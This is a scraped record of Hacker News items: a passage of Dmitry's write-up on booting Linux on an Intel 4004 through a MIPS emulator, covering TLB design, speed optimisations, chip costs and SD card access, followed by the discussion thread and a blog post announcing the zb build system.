cycles) to see the issue. During a memcpy() in the kernel, a word was loaded into $t1 register from memory, it was then, a few MIPS instructions later, written out to another memory location. The copied data, in this case, was text output for printk(). It seemed that the value was being read correctly, and was properly stored into the 4002 where the emulated $t1 lived (the second chip). But when it was loaded for the write, the bottom bit was missing. This seemed to indicate an issue with this particular 4002. I replaced it, and, after a day of waiting, I saw the text working properly. It is curious, however, that losing a random bit sometimes when copying memory did not stop Linux from booting. Very curious! I did make a test board to test 4002s to verify the issue. I was able to confirm that the 8th nibble would sometimes lose its bottom bit on this chip. It seemed to happen randomly, not always. No other bits were fragile in this way, and this bit never flipped from a 0 to a 1, only from a 1 to a 0. Strange. But then again, these are DRAM internally, with refresh and all. For all I know, this particular chip could have suffered an ESD strike a decade before I was born... This chip was labeled \"retired\" and moved to live on a big farm out of town. More MIPS emulator fun Memory translation MIPS R3000 has 64 TLB entries, but Linux never does anything that requires this exact TLB entry count. This makes sense since it only uses indices it gets from TLBP (tlb probe) and indices pre-populated by the CPU itself on exception. When it writes a new entry, it uses TLBWR, which writes a random entry. This indicates that Linux might be able to cope with having fewer TLB entries. I tested this, and it worked precisely as expected. I decided to go with 16 entries, since this makes it easy to address each entry with a nibble. This also means that one full RAM bank would store all the TLB state. Cool. As I explained before (and I advise you to read it), the MIPS TLB is best emulated using a hashtable. As I explained above, the 4004 sucks at ... well .. everything. Using XOR or even AND for hashing would be a nonstarter as instructions to perform them quickly do not exist. I collected a list of all virtual addresses translated during Linux boot, and tried to find something that would be a passable hash function and also be easy and fast to compute on the 4004. I decided on taking the 3rd nibble of the address and adding it to the 6th nibble of the address. The resulting value can be the hash of the address, placing it into one of 30 buckets. This produced passable results and does not take too long to compute. Status nibbles of the 4002s came in handy here. While the actual TLB entries live in data nibbles, each entry taking up one \"register\", the status nibbles provide links to \"prev\" and \"next\" entries in the current hash bucket. For the first entry in the chain, the bucket index is stored instead of \"prev\". This allows easy removal, which is needed on TLB write. Debugging the emulator Predictably, a brand new emulator, written in assembly for a new platform will have bugs. u4004 made debugging easier, since at least I did not need to use real slow hardware. Additionally, it could be instrumented to understand the deeper emulated MIPS system. I commandeered a few unused 4004 opcodes to mark a few important places in the emulator. One of them was the place where a new MIPS instruction had just been fetched. This opcode will be ignored by a real 4004 (treated as a NOP). u4004, however, knows the memory layout of the emulator and can do more checks. It has the option to log the emulated MIPS state to console for easier debugging. It can (and does) also check the TLB state for consistency. Getting this right took a lot of work, so having this auto-checker was worth its weight in gold. If it notices an inconsistency, it will abort the emulation. What good is aborted emulation? Well, u4004 also records the state of the entire 4004 CPU every single cycle. On abort, it will print out the state for the last 16,384 4004 instructions, allowing a lot of backtracking to see what went wrong to cause the inconsistent TLB state, why, and how. This proved to be instrumental in a few tough-to-catch bugs my MIPS emulator had. Sixteen thousand 4004 instructions is, usually, at least 10 MIPS instructions. As the TLB checker is engaged after each one this allows for a lot more lookback than should ever be needed. MOV MIPS has no MOV instruction. To copy a register to another one, a number of instructions can be used: an addition of zero (immediate or register), a logical or exclusive OR with a zero (immediate or register), a left shift by zero bits, a logical AND or OR of a register with itself. Different compilers do different things, and I tried to make sure my code had fast paths for the most common ones: shift left by zero bits and immediate add of zero. Playing tetris As conditional jumps have limited range that is also not symmetric (depending on the position of the jump instruction), code placement is crucial. This is also true for jumptables which must start at the start of a ROM page. It is equally crucial for LUTs that also need that same alignment. This all means that code gets moved around a lot, and every time some piece of code changes size, other pieces need to move around to maintain reachability of jumps. I had to do this a lot during development. You'll see a lot of ORG directives in the assembly that align code to proper boundaries. Sadly, the A04 assembler does very little checking around this, so an ORG directive that moves the current output address backwards does not get treated as an error, instead blindly overwriting the old bytes at the same output address. This caught me by surprise a few times during development, causing crashes. I advise you to be careful if you try to modify the emulator. Speed optimization Methodology Now that I had a working emulator of my actual board I would build, I could run multiple versions of firmware on it to evaluate speed it would have had on real hardware. This was much better than testing on the real board, waiting for days for a single boot to complete (or fail). I did a lot of this, trying many things, incorporating improvements into the firmware, tracking boot time to first shell prompt. Once the emulator emulated a real SD card and real SPI PSRAM without hypercalls, the expected boot time could be measured and would have been around 8.9 days of real time on a real 4004 at 740KHz. My initial goal was to get the boot time under a week. Looking back at my log, some of the major wins on this were: lookup tables for logical ops and a lookup table for multiplication. This brought the expected boot time down to 8.4 days. At this point in time, I added some profiling to the emulator and had it print the hottest instructions. This provided some guidance! Fetch The longest part of emulating any instruction turned out to be reading it from memory. I considered adding an i-cache but this would require keeping the PSRAM chips' select line active even longer. Since I was already out of spec by a factor of a thousand, I did not wish to push my luck. It would have also required more RAM, and this was counter to my desire to minimize RAM usage to make the project more affordable. So what could I do? First, I unrolled the loop that received a nibble of data from SPI PSRAM, then I did the same for the code that sent a nibble. This lowered the boot time all the way down to 7.25 days! Memory copy Since it is impossible to pass 32-bit values in registers in 4004 assembly (that would take up half the entire register file), data is often passed to functions in specified memory locations. This means that quite a lot of time is spent copying data into and out of those locations. From the very start I made sure that no data crossed the 16-nibble address boundaries so that a simple increment could be used to access all variables, but even then, copying 8 nibbles took a while, especially between memory banks. Now that I had more ROM space, compared to when I initially started intending to fit into 4KB, I specialized some copies, unrolled some as well. The boot time dropped to 6.63 days! More RAM I noted that I had one pin free on the output port from the 4002 that drove my PSRAM. I wondered if I could add another PSRAM, to give Linux more RAM. Adding it was not too much work, mainly having to do with decoding the address to sort out which PSRAM to activate. Since Linux will handle non-contiguous physical RAM space, I could take advantage of this to make decoding easier. So, my first RAM chip is emulated at 0x80000000, while the second starts at 0x82000000. This particular arrangement allows the assembly code to quickly go from address to proper port value to select the correct chip. I also added code to probe RAM size in my MIPS bootloader (more on which later) and pass this to Linux. Sadly, adding more RAM slowed the boot down. Linux creates data structures at boot that track physical pages and with more pages, more of them had to be created. Some kernel data structures are also dynamically sized based on available memory, and that also suffered. At this point in time with 16MB of RAM, boot time was projected to be 7.19 days. Back over a week! Womp! Clawing it back I was not going to give up so easily. More specialized memory copying routines were created, instruction dispatch got better by a cycle here and there. It was getting close - 7.03 days. I had an epiphany then. Why have a separate memory storage for the current instruction if I was already going to load it into registers? If I carefully track their liveness, I can skip this entirely and just load it into the same temporary storage that all memory loads go to. Down to 6.50 days! Better shifts Recall that I initially implemented logical shifts as one-bit-at-a-time, as a sacrifice to my lack of ROM code space. Well, now I had more space, so it was time to improve. I rewrote the shifts to first do full-nibble copies for any part of the shift that was a multiple of 4 bits, and then do bit-by-bit shifts for at most three iterations. For left shift this was trivial, but for arithmetic right shift this required some careful consideration for proper sign extension. After some fun debugging of some cases where I got it wrong, it worked. Boot time was projected at 6.19 days! More RAM access unrolling There were a lot of things I could do now that I had more ROM space. Unrolling the PSRAM address-sending code, which ran on every access had some nice pay-offs. The loop control was not very much there, but for code that runs a lot, every cycle matters. How much? Unrolling that loop with 6 iterations lowered the boot time to 6.01 days! That is not bad at all for some copy-n-paste work! A look at WHAT runs The Linux kernel contain{s,ed} a whole lot of nonsense that this system would never need. Nobody is going to be doing TCP/IP at this speed, nor does it really need support for esoteric filesystems or antique syscalls that nobody has used since the 1990s. I went to town removing kernel configs that were of no use! The kernel size shrank down to about 2.5MB and the boot time dropped too. A part of the drop was simply the time it took to load the kernel to memory, but another part was the kernel no longer initializing subsystems that would never be of use. The kernel also creates a dummy console in RAM to log to, even if told to log to serial console. Managing that and virtually \"scrolling\" it took noticeable time, so I configured it to be 1x1. This made a noticeable boot time difference too! Almost all of my initial testing was with init=/bin/sh kernel command line, but this is not fair, since this does not leave you in a good state, with no session, no $PATH, no /proc or /sys, etc. On the other hand, using a real init would take months, since the password hashing itself would take that long. I wrote a tiny init (init=/sbin/uMIPSinit) that would set up a sane session, mount /proc and /sys, set the hostname and $PATH, and finally launch sh repeatedly as it dies. The sources to it are in the disk image at /root/init.c. Obviously this made the boot slower, but the smaller kernel made up for it. Boot time was 5.33 days now! Linux supports block devices over 2TB in size. I had a hunch that disabling this support would help with speed. Why? A 2TB device of 512-byte sectors has sector numbers not representable by 32-bit numbers, necessitating 64-bit math. 64-bit math on a 32-bit MIPS CPU takes a lot of work, so I had a hunch that avoiding it would help. It did, but it also presented a fun problem. My rootfs, being a garden-variety ext4 filesystem had (as is default) huge_files feature enabled. This had to be disabled to allow it to be mounted read-write on a kernel with huge block device support removed. It was all worth it though! The boot time dropped to 4.81 days! Fetch again As a special last-ditch optimization, I added a code path for instruction fetch from SPI PSRAM, this code path assumes the read is 32 bits in size and that it targets SPI PSRAM. This is sane because the virtual system has no other places to run code from. Avoiding checks for need to sign-extend and for size loops added a small additional speed benefit: 4.76 days to boot! This calculates out to being around a 70Hz MIPS machine if the 4004 is run at 740KHz. On host CPU speed As mentioned before, each 4004 instruction takes either 8 or 16 clock cycles to execute. The 4004 is specified to run at 740KHz. Intel wanted to ship it at 1MHz, but apparently it couldn't perform at that speed across its entire temperature and voltage range. On my board, however, I am overclocking it to 790KHz with no issues. This is accomplished by running the 4201 in \"divide by 7\" mode with a 5.5296MHz crystal. For a Linux boot with my emulator, the actual 4004 instruction mix is 8.8% 16-cycle instructions, 91.2% 8-cycle instructions. This means that on my Linux/4004 board the effective speed of the 4004 is 90,640 instructions per second! I am not yet sure if this is a cause for celebration or tears. Hardware cost optimization \"Affordability\" Throughout this project, ability for someone to replicate my work was my top concern. This is why I avoided using a 4265, for example. I could have avoided using the 4201, but the alternative methods of generating the clock were quite complicated and not very precise clock-speed-wise. Intel's recommended clocking schematic is shown in a previous section above. It is quite a mess. I simply did not want to do that, so I chose to use a 4201. Using the 4289 was a simpler decision. It is much easier available than the 4008 + 4009 combo. I considered designing the board to accept either of those, but lacking a 4008 to test wish, I decided to not risk it. I did design the board to accept a 4040 instead of a 4004, and verified that this works. No extra capabilities of the 4040 are used, to maintain the 4004 compatibility. In reality, the benefits would not be great, anyways. Most of the RAM usage by the emulator is non-negotiable. The MIPS register state will never be smaller than 32x 32-bit registers. The emulator state will never be smaller than the 96 bytes it occupies. However, the TLB can be variably-sized, as I mentioned above. So, in the interest of allowing some money to be saved in replicating this project, my code allows one to populate 1, 2, 3, or 4 chips in the 3rd RAM bank, producing a TLB of 4, 8, 12, or 16 entries. The chips in that bank need to be populated in-order, from left to right, so the options are 1 or 2 4002-1s, and if you have two populated, then you may also populate 0, 1, or 2 4002-2s. As expected, the performance scales inversely to the number of TLB entries. I should warn, however, that the 4002s that provide the TLB also provide the LED outputs for the high 16 bits of the PC display LEDs, so if you partially populate this RAM bank, some of the LEDs will not work. A fun sidenote: the code actually will probe and support any TLB size from 1 to 16 entries. Each 4002 holds 4 entries so in the real world, only multiples of 4 are possible, but in the emulated world, anything is possible, so I tested every value between 2 (the minimum to boot) to 16. Here you can see a graph of the number of MIPS CPU cycles needed to boot to shell vs the number of emulated TLB entries. It is notable that while the difference from 4 entries to 8 is large, the difference from 12 to 16 is not, so populating just an 8-entry TLB might be enough. This can save you about $50 at current prices... The prices for 1971 chips Sadly, you'll still spend quite a bit of money buying the 1970s parts. Here I have a table of the necessary old chips, their various names, and my best guess as to how much you'll pay (as seen by me on eBay USA at the time of publication). Some parts were only available from intel, while others were also available from National Semiconductor. Parts annotated with (g) are ceramic with gold (usually white ceramic, most rare, most expensive), (c) are parts that are grey ceramic (also rare, also expensive), and parts with no annotations are plastic and are the cheapest (still expensive). All of the part numbers listed in each cell function identically so you can buy the cheapest. I also designed this board to accept either a 4004 or a 4040, so you only need to buy one of them, probably whichever is cheapest. I am unable to explain the price difference between 4002-1 and 4002-2, since they are basically the same chip. PART USE # NEEDED Typical $ NAMES 4004 CPU 1 or 0 $250 C4004(g) D4004(c) P4004 INS4004D(g) INS4004J(c) 4040 CPU 0 or 1 $60 C4040(g) D4040(c) P4040 4201 CLOCK 1 $50 C4201(g) D4201(c) P4201 INS4201J(c) INS4201N 4002-1 RAM 1 5 - 6 $7 C4002-1(g) D4002-1(c) P4002-1 INS4002-1D(g) INS4002-1J(c) INS4002-1N 4002-2 RAM 2 3 - 5 $25 C4002-2(g) D4002-2(c) P4002-2 INS4002-2D(g) INS4002-2J(c) INS4002-2N 4289 ROM CTL 1 $70 C4289(g) D4289(c) P4289 It should be noted that the prices are so high because of \"collectors\" who buy up these CPUs with no intention of ever using them. To them, any 16-pin chip laser-engraved with \"P4004\" would do just fine, but they instead insist on buying real chips, denying their use for real projects! What a dick move! However, it gets worse. The chips with gold caps are also sought out by people who \"harvest\" gold from them. This is a euphemism for grinding them up, destroying them forever. Ugh! The modern parts The modern parts of this project are downright affordable in comparison. The one thing that might be hard to source is the SPI VFD, but they do show up on eBay often, and I got mine for $15 each. Alternatively, another SPI display can be used with small code changes. You can also just not populate the VFD at all and interact with the device over the serial port only - this is fully supported and works well. I also added some cleverness around the SPI PSRAM usage. PSRAM chip count and size is auto-detected. The first PSRAM must be at least 4MB in size, since the kernel expects to be loaded contiguously there and it is 2.5MB in size. So populate a 4MB or an 8MB chip first. If you work at ISSI and have access to a pre-production 16MB chip, that will also work. The second PSRAM chip can be left unpopulated, or populated with any size chip you have. I tested everything from 128KB to 8MB. Keep in mind that while more RAM will help Linux run better, it will slow down the boot process slightly. Sizes under 128KB are unsupported. Thanks to my work on minimizing the size of the Linux kernel by aggressively culling the kernel config, the kernel I provide is small enough that you can boot to a shell prompt without using swap on only 4.5MB of RAM (eg: a 4MB chip + 512KB chip). You may then enable swap and go on. Although, given the cost of 8MB PSRAM chips, I do not know why you'd do this other than just curiosity. How it works The connections At a high level, ignoring all the level shifting messes, the board is pretty simple. The 4201 generates the clock and reset signal for all the components. An RC network generates the reset input signal for it. The 4002s in the first and third banks are connected to the PC LEDs, in the obvious order. The first bank provides the low 16 bits, the 3rd provides the high 16 bits. The second RAM bank provides all the outputs used for driving various SPI busses and the ROM bank selection, so any 4002 mentioned from now on in this section is a 4002 in the second RAM bank. This RAM bank is composed of three 4002s. Board space is provided for a fourth 4002 in this bank, if you want to use this board for some other reason, eg as a fancy 4004 dev board. The first 4002 in this bank is used for the SD card's SPI bus. In order, the output pins are: MOSI, CLK, and nCS. The last output pin acts as A12 to the ROM, flipping ROM between bank 0 and bank 1. The second 4002 is used for communications. Its outputs, in order, are: MOSI, CLK, VFD.nCS, UART.nCS. The third 4002 is used for the PSRAMs. Its outputs, in order, are: MOSI, CLK, RAM0.nCS, RAM1.nCS. The 4289 is connected to the lower 12 address lines of the ROM. Its inputs are, in order: PSRAM.MISO, VFD.MISO, UART.MISO, and SD.MISO. UART chip's IRQ line drives the TEST input on the 4004. That is basically it! SD card access What could be simpler, one would think, than accessing an SD card? The spec is rather clear on how to do that over SPI: three wires to the card, one back; send some commands to init it, then one command is for read and another is for write. Trivial, right? It might be for modern microcontrollers that have kilobytes of RAM. The Linux/4004 board has a total of 440 bytes of RAM, if you count the un-addressable status nibbles, 352 if you do not. Of them, 160 (or 128 if you do not count the status nibbles) are hard-allocated to virtual MIPS registers, and another 160 (or 128 if you do not count the status nibbles) are hard-allocated to the TLB. This leaves 120 (96) bytes of RAM left. This is not enough to talk to an SD card, since the minimum unit of reading or writing an SD card is a 512-byte sector (very old SD cards allowed partial-sector reads, but partial-sector writes were never a thing). Adding another full RAM bank would only add 128 addressable bytes. It would take 4 full banks to fit a single 512-byte sector. This would force me to use an external 3-to-8 decoder to allow the 4004 to address this much memory. Plus, those chips are expensive! And, I had sworn I would not do this. Another solution was needed. Well, the SD card has its own SPI bus, as do the PSRAMs. The emulator itself never really needs to process SD sectors' contents, only place them into the virtual RAM or write them from the virtual RAM to card. So, the SD sector data can always be read directly into PSRAM, or from it. This will work nicely since they have separate SPI busses. As we read card data, every 4 bytes we read, we'll write to PSRAM at the requested address, and then increment it by 4. Repeat 128 times. Writes will work much the same way. Due to the slowness of the 4004, this process is hilariously slow. It takes a bit over a second to read or write a sector to the card. But at least no extra 4002s chips are needed! Which brings us to a potential issue with SD card access. The SD spec specifies that to properly initialize an SD card, one needs to send ACMD41 at a clock rate of 100KHz - 400KHz, and at least once every 50ms. The SPI bit-banged out the output ports of a 4002 cannot meet either of those timings. I cannot even approach them. I had some concerns. They went away quickly. Every SD card I tested happily initialized even at 5KHz, with ACMD41 sent every 200ms or even more rarely. I guess this makes sense since modern SD cards do not use the provided clock for anything internal, like original ones might have considered doing. How it boots The firmware necessarily must know how many TLB entries there are, since it needs to prevent the virtual MIPS CPU from populating the INDEX register with a higher value, and it needs to make sure that the RANDOM register also never presents a higher value. The firmware, thus, starts by probing the number of memory chips in the third bank, to then figure out how many TLB entries there are. Then, the VFD and the UART chip are initialized, then the SD card is initialized. If this fails, a message is shown: \"Failed to init SD card. Halting here and now!\". This message is the only string in the entire firmware, si",
    "commentLink": "https://news.ycombinator.com/item?id=41600756",
    "commentBody": "Linux/4004: booting Linux on Intel 4004 for fun, art, and no profit (dmitry.gr)315 points by dmitrygr 7 hours agohidepastfavorite52 comments johnklos 1 hour agoWow. And I thought modern NetBSD on a 15 MHz m68030 with a 16 bit memory bus and 10 megabytes of RAM is slow. This is crazy! It illustrates a point I've explained to many people over the years: once computers started coming with persistent storage, open address spaces and MMUs towards the late '80s and early '90s, we basically arrived at modern computing. An Amiga 3000 or i80486 computer can run the same things as a modern computer. Sure, we have ways to run things orders of magnitude faster, and sure, we now have things that didn't exist then (like GPUs that can run code), but there's no functional difference between those machines and new ones. I love that Dmitry shows how loosely \"functional\" can be defined :) reply jylam 34 minutes agoparentThat's basically the concept of Turing Completeness. Any Turing complete system can run anything. It may be very slow, but it will run. ChatGPT could run on a 4004, all you need is time. reply byteknight 11 minutes agorootparentAnd a gargantuan amount of RAM. reply qwerty456127 21 minutes agorootparentprevhttps://cs.stackexchange.com/a/60978 reply dmitrygr 1 hour agoparentprevI don’t know if this was a thing in America, but in USSR in the 70s and 80s it was very popular to play chess-by-correspondence. You would literally snail-mail letters back-and-forth with your move. Games would last months or years. It added an extra challenge to chess because by the time you got a response, you might have forgotten what strategy you had had. This project is basically Linux-by-correspondence. The challenge is here too. By the time the command produces an output, you might have forgotten why you ran it. reply noufalibrahim 1 minute agorootparentThere was something called Agora (https://en.wikipedia.org/wiki/Agora_(web_browser)) which was sort of an email/http proxy. You could browse the web via. email and set \"GET\", \"POST\" etc. commands. It was my first exposure to the web. It sounds very similar to what you mentioned. reply johnklos 2 minutes agorootparentprevI installed Windows 95 on an Amiga 3000 with a 25 MHz m68030 via floppy to see if DMF formatted disks would work and to play around. By the time it finished, I had forgotten what I wanted to try out. reply molticrystal 3 hours agoprevI love giving the AVR example when people ask if something can run on an underpowered machine, now I have a new example to link. Considering the frequencies and wattage I wonder how RF it spits out and what is detectable and decodable on the waterfall of a SDR. By the way still reading through it, but at the time of this comment I see the word \"soubroutine\" which is probably a misspelling. reply dmitrygr 3 hours agoparentFixed the typo. Thanks reply alnwlsn 5 hours agoprevWow this was not a cheap project! Thanks Ebay collectors. Also probably the only time I'd have gone for an LCD over a VFD. If you're running a multi-year long compile, it'll probably be burned in to hell by the end. reply eqvinox 6 hours agoprevoof. amazing. …you can see in the high PC bits what's currently executing! P.S.: Still loads the kernel faster than a virtual ISO on a server's shitty IPMI over the internet ;D reply dmitrygr 3 hours agoparentWhile it boots, you can look at LEDs and map them to kernel function easily by running “nm” on vmlinux. Also, when in user space, you can tell between the main binary (way below 0x01000000) and shared libraries (loaded high near 0x77000000) reply eulgro 7 hours agoprevThe video took 9 days to film. 4 hours per emulated second. Also I wonder why he's using Windows 95? reply danirod 6 hours agoparentSorry for the nitpick, but the laptop in the video looks like Windows 2000 reply phatskat 4 hours agorootparentThe best Windows imo reply pkphilip 1 hour agorootparentTrue reply dmitrygr 3 hours agoparentprevWindows 2000 For the video, i wanted a laptop with a real serial port (no usb). This one fit the bill and was $20 on eBay. Windows 2000 is the prettiest windows IMHO, so that’s what I installed for the demo video. reply PaulHoule 6 hours agoprevVirtual machine (as in the Z-machine or the JVM) worked on early micros when you couldn’t use them as compiler targets. See https://en.wikipedia.org/wiki/SWEET16 https://en.wikipedia.org/wiki/UCSD_Pascal reply jart 6 hours agoprevThere needs to be something like a Nobel Prize for this kind of thing. reply seqizz 5 hours agoparentProbably closest would be the Ig: https://en.wikipedia.org/wiki/Ig_Nobel_Prize reply jart 56 minutes agorootparentThat's kind of insulting honestly. Getting Linux to run on an i4004 is bona fide engineering. More real than engineering that we're paid to do most times. Looking at the list of Ig Nobel Prize winners it sounds like The Onion but not funny. reply fortyseven 20 minutes agorootparentSupposed to be, apparently. reply garganzol 2 hours agoprevThe proof of the Turing Completeness Theorem in action. Beautiful. Boot time is ~5 days. reply Pet_Ant 4 hours agoprevIn the \"Why MIPS?\" section: > some have shitty addressing modes necessitating that they would be slow (RISCV) What is wrong with the RISC-V addressing modes? reply Rohansi 3 hours agoparentProbably nothing unless you want to emulate it on severely underpowered hardware. reply blueflow 7 hours agoprevAt first i was like \"I'm pretty sure this is bullshit or some cheat used\" but then i was like \"Oh, its dimitry.\" Impressive work, as always. reply adrian_b 6 hours agoparentVery impressive work, but most of the work has been necessary because Intel 4004 was not really the first microprocessor, this was just BS propaganda used by Intel to push back by one year the date of the launch of the first microprocessor, to 1971. The first true (civilian) microprocessor was Intel 8008, in 1972. Intel 8008 was a monolithic implementation, i.e. in a single PMOS integrated circuit, of the processor of Datapoint 2200, therefore it deserves the name \"microprocessor\". The processor of Datapoint 2200 had an ugly architecture, but there is no doubt that it was a general-purpose CPU and traces of its ISA remain present in the latest Intel and AMD CPUs. On the other hand, the set of chips that included Intel 4004 was not intended for the implementation of a general-purpose computer, but it was intended just for the implementation of a classic desktop calculator, not even a programmable desktop calculator. This is the reason for the many quirks of Intel 4004, e.g. the lack of instructions for the logic operations, and many others that have increased the amount of work required for implementing a MIPS emulator suitable for running Linux. Even if Intel 4004 was intended for a restricted application, after Intel has offered to sell it to anyone, there have been many who have succeeded to use it in various creative ways for implementing microcontrollers for the automation of diverse industrial processes, saving some money or some space over a TTL implementation. In the early days of the electronics industry it was very normal to find ways to use integrated circuits for purposes very different from those for which the circuits had been designed. Such applications do not make Intel 4004 a true microcontroller or microprocessor. Very soon many other companies, and later also Intel, have begun to produce true microcontrollers, designed for this purpose, either 4-bit or 8-bit MCUs, then Intel 4004 has no longer been used for new designs. reply kens 2 hours agorootparentI'm glad to see the Datapoint 2200 is getting attention, but by reasonable definitions of \"microprocessor\", the Intel 4004 was first, the Texas Instruments TMX 1795 was second, and the Intel 8008 was third. It seems like you're ruling out the 4004 on the basis of \"intent\" since it was designed for a calculator. But my view is that the 4004 is a programmable, general-purpose CPU-on-a-chip, so it's a microprocessor. Much as I'd like to rule out the 4004 as the first microprocessor, I don't see any justifiable grounds to do this. Intel's real innovation—the thing that made the microprocessor important—was creating the microprocessor as a product category. Selling a low-cost general-purpose processor chip to anyone who wanted it is what created the modern computer industry. By this perspective, too, the 4004 was the first microprocessor, creating the category. My article in IEEE Spectrum on this subject goes into much more detail: https://spectrum.ieee.org/the-surprising-story-of-the-first-... reply klelatti 2 hours agorootparentprevYour argument is that because the 4004 was built to power a calculator that disqualifies it as a microprocessor? Independent of the actual nature of the 4004 itself and its potential applications beyond its first intended use? Can’t see how that makes sense at all. Your statement about Intel 'pushing back' the date to 1971 also makes little sense given Intel advertised [1] the 4004 as a CPU in Electronic News in Nov 1971. [1] https://en.wikipedia.org/wiki/Intel_4004#/media/File:Intel_4... reply MarkusWandel 5 hours agorootparentprevNo kidding about unusual uses of ICs. Not related to microprocessors, but I have an old analog triple conversion HF receiver (Eddystone EC958/3 for what it's worth) that uses a TTL IC in an analog circuit! I'd have to look at the schematic again, I think it's a multi-stage counter, but basically what it uses it for is to generate a comb shaped spectrum, one \"spike\" of which can then be picked up by an analog circuit and locked to, to generate precisely spaced tuning steps for the high stability tuning. reply dmitrygr 2 hours agorootparentprevThe naming and propaganda wouldn’t matter. I just wanted something lower-end for sure than a 6510 and an AVR. 4004 is that reply cdchn 2 hours agorootparentIs this the oldest piece of hardware that's ever run Linux, I'm left wondering? reply dmitrygr 2 hours agorootparentIt surely is reply dboreham 2 hours agorootparentprevGlad to see someone besides me posting this whenever 4004 history-rewriting comes up. reply artyom 3 hours agoparentprevI didn't know the guy but he clearly knows what he's doing, it's unbelievably entertaining to read the details of achieving an impossible task with the most underpowered tool possible. reply ssrc 6 hours agoparentprevI mean, it's fun and interesting bullshit that cheats a lot. I'm sure that you could emulate a MIPS using a one-bit processor like the MC14500[0] with enough supporting hardware, real or virtual. Looking forward to it, Dimitry. [0] https://en.wikipedia.org/wiki/Motorola_MC14500B reply alnwlsn 5 hours agorootparentWe need this for the Usagi Electric vacuum tube computer. reply dmitrygr 3 hours agorootparentprevI’ll work on setting a new lower record every ten years or so. My guess at the next three steps: one bit controller, transistors only, vacuum tubes. reply mrguyorama 48 minutes agorootparentAt some point you will just need to offload the actual \"processing\" part to some nice old chap named Dave who has himself an abacus, and every now and then you send him a letter and he moves some stones and sends a letter back with the result. reply dmitrygr 39 minutes agorootparentCPU-by-correspondence! reply StefanBatory 47 minutes agoprevThis is absolutely insane - hats off to you. To say it's impressive it's like to say nothing. reply hilbert42 5 hours agoprevMission impossible — do it with Windows! reply dmitrygr 3 hours agoparentWindows ran on a similar MIPS machine (Microsoft jazz). The issue is emulating scsi. I think I’d need a lot more rom space to do that. Scam is messy and hard. The alternative is to find the Windows MIPS DDK and build a paravirtualized disk driver for it like I did for Linux. That would make it more doable. reply jesprenj 6 hours agoprev [–] > But for the one I'll have hanging in my office, I have loftier goals. With swap enabled, the kernel sources can actually be built right on-device. It will take some number of years. The partition where the kernel lives is /dev/pvd2 and is mounted under /boot. The device can build its own kernel from source, copy it to /boot/vmlinux, and reboot into it. If power is interrupted, thanks to ext4, it will reboot, recover the filesystem damage from the journal, and restart the compilation process. That is my plan, at least. reply whartung 4 hours agoparentI have two visions of this. One, it reminds me of that \"worlds longest song\" or somesuch thing, where they play a note every 10 years. The other is just a picture of someone, asleep at their desk, a pile of calendars with days checked off tossed to the side, random unwashed mugs and such all dimly lit by a desk lamp and see the `$ make linux` finally return to an new, unassuming `$` prompt. Like Neo in the Matrix. reply dmitrygr 3 hours agorootparentI like the second version! reply Pet_Ant 4 hours agoparentprevI wonder of you can calculate when it will finish by counting the instructions and then pin the date it will finish and stream the completion. reply dmitrygr 3 hours agorootparentYes. I have an emulator of this board (it is in the downloads too) which is much faster than the real thing. It shows how much realtime is needed to get to the current state. Doing a build in it will answer the question unequivocally. reply ladyanita22 25 minutes agorootparentUpdate us please!! reply 01HNNWZ0MV43FF 2 hours agoparentprevArs Longa, Vita Brevis reply teaearlgraycold 2 hours agoparentprev [–] I’d assume you’d have at least a few bit flips occur in the process. reply dmitrygr 37 minutes agorootparent [–] Very large-process DRAM with frequent refreshing, in ceramic cases. It might last long enough without flips reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A tech enthusiast successfully booted Debian Linux on a 4-bit Intel 4004 microprocessor from 1971, showcasing the capabilities of this historic CPU.",
      "The project involved creating a custom development board and writing a 4004 emulator to run a MIPS R3000 emulator, demonstrating significant hardware and software optimization.",
      "This achievement highlights the potential of low-end hardware and serves as a milestone in the history of computing, pushing the boundaries of what older technology can accomplish."
    ],
    "commentSummary": [
      "Dmitry has successfully booted Linux on an Intel 4004 microprocessor, a feat that showcases the extreme limits of Turing Completeness and computational capability.",
      "The project highlights the historical significance of the Intel 4004, the first commercially available microprocessor, and demonstrates its ability to run modern software, albeit extremely slowly.",
      "This achievement has garnered significant attention due to its technical complexity and the novelty of running a modern operating system on such an underpowered and ancient piece of hardware."
    ],
    "points": 315,
    "commentCount": 52,
    "retryCount": 0,
    "time": 1726830255
  },
  {
    "id": 41595310,
    "title": "Zb: An Early-Stage Build System",
    "originLink": "https://www.zombiezen.com/blog/2024/09/zb-early-stage-build-system/",
    "originBody": "zb: An Early-Stage Build System By Roxy Light I have decided to develop zb, my experiment in user-friendly reproducible builds, into a full-fledged build tool. Although my previous blog post stated that I would not be developing this tool to production-readiness, a few things changed my mind: My personal projects need a dependency management solution, and I am loath to continue investing in Nix. I believe that many projects can benefit from a better dependency management/build tool, especially with the increasing industry-wide focus on supply chain security. I believe zb could serve that need. zb is fun to work on! It’s an interesting challenge to provide a simple interface to a sophisticated build model. As a build system, zb provides: A familiar language for configuration. zb uses Lua to avoid introducing a significant programming language barrier. Lua has been used in a variety of applications to provide scripting facilities. Lua’s small codebase made it straightforward to extend for zb to include dependency information in every string. Powerful build features. In the language of Build systems à la carte, zb is a suspending scheduler with constructive traces. This puts zb in the category of the hypothetical “Cloud Shake” detailed in that paper. As such, zb supports the early cutoff optimization (to speed up builds) and dynamic dependencies (i.e. Lua configurations can read files from build targets). Support for non-determinism. zb is built to handle non-determinism in builds by rerunning nondeterministic build steps and then reusing work if possible. A build will not become incorrect if a build step is not perfectly deterministic, even when sharing build cache among peers. This reduces friction in migrating a codebase to use zb from other build systems. File formats compatible with Nix. Internally, zb uses the same .drv file format and archive format as Nix, enabling tools built for the Nix store to be reused. (At the moment, there’s not a clear way to interoperate with Nix derivations, but this is hypothetically possible.) Windows support. I want a build system that works on Windows in addition to Linux and macOS so that tooling need not be split across platforms. Although zb is not ready for production use yet, I’ve reached a major milestone: zb no longer depends on Nix! I have written a build backend from the ground up that supports content-addressed derivations (a long-standing experimental feature in Nix), and more broadly, uses the “Intensional Model” described in The Purely Functional Software Deployment Model. This gives zb a strong foundation to leverage going forward. If you’re interested in trying out zb for yourself, follow the instructions in the project README. Try writing your own builds (although keep in mind the known issues) and discuss any feedback over on GitHub. My next development target is to finish the Linux userspace, which will make bootstrapping other development tools much easier. Stay tuned! (If your business would benefit from a build expert or some extra backend engineering bandwidth, I'm available for consulting and contract work! See my freelance website — 256 Lights — for details.) (Discussion on Hacker News and Mastodon.) Posted at 2024-09-19 12:05 PM Permalink #Software Development #zb",
